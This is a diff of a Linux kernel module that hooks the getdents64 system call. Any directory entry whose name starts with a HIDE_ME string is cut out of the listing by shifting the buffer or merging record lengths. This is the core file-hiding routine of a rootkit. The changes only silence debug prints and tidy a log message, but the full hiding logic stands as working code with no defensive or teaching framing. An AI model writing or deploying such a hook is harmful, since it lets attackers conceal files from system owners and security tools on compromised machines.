@@ -47,8 +47,8 @@ asmlinkage long sys_getdents64_hook (const struct pt_regs *pt_regs)
     if (kdirent == NULL)
         return ret;
     err = copy_from_user((void *) kdirent, dirent, (unsigned long) ret);//copy from user space: >ret< from >dirent< to >kdirent<
-    printk(KERN_ALERT "copy form user %u", err);
-    printk(KERN_ALERT "copy form user 1: %u", err-ret);
+    //printk(KERN_ALERT "copy form user %u", err);
+    //printk(KERN_ALERT "copy form user 1: %u", err-ret);
 
     if (err)
         {
@@ -71,14 +71,12 @@ asmlinkage long sys_getdents64_hook (const struct pt_regs *pt_regs)
          (explain later how) and then contiune*/
         dir = (void*) kdirent +i;
         // in strcmp return 0 means strings are equal
-        printk(KERN_ALERT "runnig");
-        if (((memcmp(HIDE_ME,(char *) dir->d_name, strlen(HIDE_ME))) == 0)) /*||(proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))*/
+        if (((memcmp(HIDE_ME,(char *) dir->d_name, strlen(HIDE_ME))) == 0)) 
         { 
-            printk(KERN_ALERT "found file"); 
+            printk(KERN_ALERT "found the secret file file"); 
             if (dir == kdirent){
                 ret -= dir->d_reclen;
                 memmove(dir, (void*)dir + dir->d_reclen, ret);// putting in dir the next dir in the buff
-                printk(KERN_ALERT "found it!");
                 continue;
             } 
             prev->d_reclen += dir->d_reclen;
